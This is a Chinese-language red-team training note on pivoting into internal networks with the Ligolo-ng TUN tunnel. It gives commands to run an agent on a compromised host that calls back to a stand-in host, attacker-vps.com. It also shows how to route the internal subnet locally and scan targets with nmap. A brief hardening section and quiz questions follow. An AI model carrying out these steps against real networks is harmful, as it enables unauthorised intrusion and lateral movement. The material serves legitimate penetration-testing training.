# R20.2 Ligolo-ng TUN 虛擬網卡多層次代理跳板 (Ligolo-ng Pivoting)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Ligolo-ng TUN 虛擬網卡多層次代理跳板** 的物理本質為**利用 Linux 核心的 TUN 虛擬網路介面 (Layer 3 IP 隧道)，將整個目標內網的 IP 網段直接路由至攻擊者本機的作業系統路由表，徹底免除傳統 Proxychains/SOCKS5 需針對每個工具單獨代理、無法支援 ICMP 以及不支援完整 TCP SYN 掃描的架構瓶頸**。在紅隊實戰中，當拿下具有多張網卡（如跨雙網段）的邊界主機後，部署 Ligolo-ng 可讓攻擊者本機直接 `ping`、`nmap -sS` 甚至直接開啟瀏覽器輸入內網私有 IP（如 `http://10.10.10.5`）暢行無阻。

```
[攻擊者本機 (Kali/Linux)] ── 1. 建立 tun0 虛擬網卡: sudo ip route add 10.10.10.0/24 dev ligolo
          │
          ▼ 2. 啟動 Ligolo-ng Proxy 控制端監核
[Ligolo-ng Proxy (外網端點)]
          ▲
          │ 3. 反向建立 TLS 封裝通道 (agent.exe -connect vps:11601 -ignore-cert)
          │
[內網跳板機 (內建 Ligolo Agent)] ── (掌握 10.10.10.0/24 內網連線)
          │
          ▼ 4. 攻擊者本機所有網路工具直接以 L3 路由傳輸
[本地終端直接直連: nmap -sS 10.10.10.5 / rdesktop 10.10.10.20] ──► 達成透明化無感內網漫遊！
```

## 🔬 第一動：TUN 介面封裝、L3 IP 路由與 GVisor 網路棧機制 (Mechanics & TUN Routing)

### 1. TUN (TUNnel) 設備的工作原理
Linux 的 TUN 是核心層提供的點對點 L3 虛擬網路設備：
- 傳統 SOCKS5 代理工作在應用層 (L7)，無法轉發非 TCP 流量（如 ICMP Ping, ARP 探針, UDP 封包）。
- TUN 介面接收完整的 **IP 數據包 (IP Datagram)**。
- Ligolo-ng 在攻擊者本機創建 `ligolo` 虛擬網卡，並在其代理端內嵌 **Google gVisor / Netstack** 使用者態網路協定棧。
- 當本機工具發送 IP 封包至 `10.10.10.0/24` 時，核心路由至 `ligolo` 介面，Ligolo-ng 將其封裝進 TLS 隧道轉發給 Agent，Agent 再在內網將原始 IP 封包注入目標網段。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 攻擊者本地初始化 TUN 網卡與 Proxy
```bash
# 1. 建立 TUN 虛擬網卡並啟用
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. 啟動 Ligolo-ng Proxy 控制台
./proxy -selfcert -laddr 0.0.0.0:11601
```

### 2. 內網跳板機啟動 Agent 連線
```bash
# 在受害 Linux 主機執行 agent
./agent -connect attacker-vps.com:11601 -ignore-cert

# 在受害 Windows 主機執行 agent
.\agent.exe -connect attacker-vps.com:11601 -ignore-cert
```

### 3. 控制台會話綁定與本地路由注入
```bash
# 在 Ligolo-ng 控制台中選定 session 並啟動隧道
ligolo-ng >> session
ligolo-ng (Session 1) >> start

# 在攻擊者本地終端添加內網目標網段路由
sudo ip route add 10.10.10.0/24 dev ligolo

# 直接無感測試內網主機連通性
ping -c 2 10.10.10.5
nmap -sS -Pn -p 445,3389 10.10.10.5
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **嚴格禁止工作站跨網段互通**：
   - 在核心交換機配置 Private VLAN 或微隔離策略，禁止辦公網電腦直接與其他辦公網或伺服器網段的任意埠通訊。
2. **阻斷未受信 TLS 憑證與直連外部 IP**：
   - 強制所有工作站的出站流量必須經由中繼安全網關 (Secure Web Gateway)，阻斷直接以裸 IP 發起的對外連線。

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Ligolo-ng 相較於傳統 SOCKS5 代理（如 Chisel），最大優勢是什麼？**
  - **戰術思維**：Ligolo-ng 基於 L3 TUN 虛擬網卡，攻擊者本機的所有工具（包括不支援代理的工具、Ping ICMP、SYN 掃描）皆可原生無感運行，完全無需依賴 Proxychains。
- [ ] **Q2：Ligolo-ng 內部如何實現在內網無真實網卡配置下的封包轉發？**
  - **戰術思維**：Ligolo-ng 內嵌了 Google gVisor / Netstack 使用者態協定棧，在 Agent 端以普通 TCP/UDP 套接字將 TUN 封包解析並發送至目標機器。
- [ ] **Q3：在 Windows 跳板機執行 Agent 時，需要管理員權限嗎？**
  - **戰術思維**：不需要。Ligolo-ng 的 Agent 端在受害主機上純粹作為使用者態客戶端運行，以普通使用者身分即可完成反向連線與封包轉發。
- [ ] **Q4：若目標存在多層內網（雙跳/三跳），Ligolo-ng 如何實現鏈式穿透？**
  - **戰術思維**：可利用 Ligolo-ng 的 `listener_add` 功能在第一層 Agent 上建立轉發監聽器，讓第二層內網的 Agent 反向連向第一層，實現多級鏈式路由。
- [ ] **Q5：藍隊如何在主機與網路端快速排查 Ligolo-ng 的存在？**
  - **戰術思維**：在網路端排查持續的高流量單一連線；在主機端排查進程是否打開了大量與不同內網私有 IP 的連線句柄。
